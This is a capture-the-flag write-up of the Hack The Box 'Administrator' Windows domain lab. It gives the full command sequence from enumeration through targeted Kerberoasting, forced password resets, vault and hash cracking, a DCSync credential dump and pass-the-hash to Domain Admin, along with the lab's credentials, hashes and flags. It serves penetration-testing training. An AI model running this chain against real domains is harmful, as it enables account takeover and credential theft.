# HTB Write-Up: Administrator

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Administrator) |
| Difficulty | Medium |
| OS | Windows |
| Date | October 20, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — SMB Shares, User Harvesting & BloodHound](#enumeration-smb-shares-user-harvesting-bloodhound)
3. [Lateral Movement — GenericAll Abuse via Targeted Kerberoasting (olivia → michael)](#lateral-movement-genericall-abuse-via-targeted-kerberoasting-olivia-michael)
4. [Lateral Movement — ForceChangePassword to Benjamin & FTP Access](#lateral-movement-forcechangepassword-to-benjamin-ftp-access)
5. [Credential Extraction — Password Safe Database Cracking](#credential-extraction-password-safe-database-cracking)
6. [Lateral Movement — Emily & Targeted Kerberoasting (ethan)](#lateral-movement-emily-targeted-kerberoasting-ethan)
7. [Privilege Escalation — DCSync Attack & Domain Admin](#privilege-escalation-dcsync-attack-domain-admin)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.86.65 --ulimit=5000
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 21 | FTP |
| 53 | DNS |
| 88 | Kerberos |
| 135 | MSRPC |
| 139 | NetBIOS |
| 389 | LDAP |
| 445 | SMB |
| 464 | Kerberos Password Change |
| 593 | HTTP-RPC |
| 636 | LDAPS |
| 5985 | WinRM |

The port spread — Kerberos, LDAP, SMB, and WinRM alongside an unusual open FTP service — identifies the target as a Domain Controller for the **`administrator.htb`** domain, hostname **DC**, with credentials given directly in the challenge description: **`Olivia:ichliebedich`**.

## Enumeration — SMB Shares, User Harvesting & BloodHound

### 2.1 — SMB Share Enumeration

The given credentials were used to enumerate shares with **netexec**:

```bash
netexec smb 10.129.86.65 -u olivia -p ichliebedich --shares
```

**Output:**

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

Nothing essential was accessible beyond the default shares.

### 2.2 — Domain User Enumeration

```bash
netexec smb 10.129.86.65 -u olivia -p ichliebedich --users
```

**Output:**

```
-Username-      -Last PW Set-       -BadPW- -Description-
Administrator   2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
Guest           <never>             0       Built-in account for guest access to the computer/domain
krbtgt          2024-10-04 19:53:28 0       Key Distribution Center Service Account
olivia          2024-10-06 01:22:48 0
michael         2024-10-06 01:33:37 0
benjamin        2024-10-06 01:34:56 0
emily           2024-10-30 23:40:02 0
ethan           2024-10-12 20:52:14 0
alexander       2024-10-31 00:18:04 0
emma            2024-10-31 00:18:35 0
```

### 2.3 — BloodHound Data Collection

The target was added to `/etc/hosts` and the clock synced before collection, since Kerberos is time-sensitive:

```bash
echo "10.129.86.65 administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
sudo ntpdate 10.129.86.65
```

BloodHound data was then pulled as `olivia`:

```bash
bloodhound-python -ns 10.129.86.65 -d administrator.htb -u olivia -p ichliebedich -c All --zip
```

### 2.4 — Attack Path Findings

Analysis of the graph revealed a chain of abusable AD permissions:

1. **`ethan`** has **DCSync** rights on the domain (`DC01`)
2. **`olivia`** has **GenericAll** over the **`michael`** user
3. **`michael`** has **ForceChangePassword** over **`benjamin`**
4. **`benjamin`** is a member of the **"Shared Moderators"** group

This chain — `olivia → michael → benjamin → (FTP access) → emily → ethan → DCSync` — is the full path to Domain Admin and is walked step by step below.

## Lateral Movement — GenericAll Abuse via Targeted Kerberoasting (olivia → michael)

### 3.1 — Targeted Kerberoasting Attempt

Since `olivia` holds **GenericAll** over `michael`, a Kerberoastable SPN could be added to the account on the fly and its ticket captured:

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich'
```

**Output (truncated):**

```
[*] Starting kerberoast attacks
[VERBOSE] SPN added successfully for (michael)
[+] Printing hash for (michael)
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$97b794ae405e4e0866a5235491537203$...
[VERBOSE] SPN removed successfully for (michael)
```

The recovered TGS hash did not crack against rockyou — `michael`'s password wasn't weak enough for a wordlist attack.

### 3.2 — Direct Password Reset via GenericAll

Since **GenericAll** grants full control over the object, including the ability to set its password outright, cracking wasn't necessary — the password was reset directly with **`net rpc password`**:

```bash
net rpc password "michael" "newP@ssword2022" -U "administrator.htb"/"olivia"%"ichliebedich" -S "dc.administrator.htb"
```

Access was confirmed:

```bash
netexec smb 10.129.86.65 -u "michael" -p "newP@ssword2022"
# [+] administrator.htb\michael:newP@ssword2022
```

## Lateral Movement — ForceChangePassword to Benjamin & FTP Access

### 4.1 — Resetting Benjamin's Password

`michael` holds **ForceChangePassword** over `benjamin`, so the same reset technique was used again:

```bash
net rpc password "benjamin" "newP@ssword2022" -U "administrator.htb"/"michael"%"newP@ssword2022" -S "dc.administrator.htb"
```

```bash
netexec smb 10.129.86.65 -u "benjamin" -p "newP@ssword2022"
# [+] administrator.htb\benjamin:newP@ssword2022
```

### 4.2 — FTP Access via Shared Moderators Membership

`benjamin` belongs to the **"Shared Moderators"** group, which suggested access to some shared resource. SMB shares yielded nothing new, but the open **FTP** service — which normal domain users could not reach — accepted `benjamin`'s credentials:

```bash
ftp 10.129.86.65
# Name: benjamin
# Password: newP@ssword2022
230 User logged in.
```

A single file was present:

```
ftp> ls
10-05-24  09:13AM                  952 Backup.psafe3
ftp> get Backup.psafe3
```

`Backup.psafe3` is a **Password Safe** database — an encrypted password manager file, worth cracking offline.

## Credential Extraction — Password Safe Database Cracking

### 5.1 — Cracking the Master Password

The database's master password hash was extracted and cracked with **John the Ripper**:

```bash
pwsafe2john Backup.psafe3 > hash.txt
john hash.txt --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**

```
tekieromucho     (Backu)
1g 0:00:00:00 DONE
```

### 5.2 — Opening the Vault

The database was opened with the **`pwsafe`** client, using the cracked passphrase `tekieromucho`, revealing the stored entries by right-clicking each username to copy its password:

```bash
pwsafe Backup.psafe3
```

**Recovered credentials:**

| User | Password |
| --- | --- |
| alexander | `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw` |
| emily | `UXLCI5iETUsIBoFVTj8yQFKoHjXmb` |
| emma | `WwANQWnmJnGV07WQN8bMS7FMAbjNur` |

Of these, **`emily`** is the one that matters: BloodHound showed she holds **GenericWrite** over `ethan`, who in turn has **DCSync** rights on the domain — the final link in the chain to Domain Admin.

## Lateral Movement — Emily & Targeted Kerberoasting (ethan)

### 6.1 — Shell as Emily & User Flag

```bash
evil-winrm -i 10.129.86.65 -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
```

```powershell
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
7beb909994867454247dcffea46e22a3
```

### 6.2 — Targeted Kerberoasting Against Ethan

With **GenericWrite** over `ethan`, the same targeted Kerberoasting technique used against `michael` in Section 3 was repeated — this time the resulting hash would prove crackable:

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

**Output (truncated):**

```
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$a992460cad6fc2ebdc056c30865cfad2$...
[VERBOSE] SPN removed successfully for (ethan)
```

### 6.3 — Cracking the Ticket

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
Status...........: Cracked
```

Recovered credentials: **`ethan:limpbizkit`**

## Privilege Escalation — DCSync Attack & Domain Admin

### 7.1 — DCSync as Ethan

BloodHound had flagged `ethan` with **DCSync** rights on the domain, which allow an account to request replication data directly from the DC — effectively dumping every credential in the domain without needing a shell on it. This was carried out with **impacket-secretsdump**:

```bash
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.86.65
```

**Output:**

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
```

The **Administrator** NT hash was now in hand.

### 7.2 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i 10.129.86.65 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5bc160df6da4579f2aa2f95ddcb0751b
```
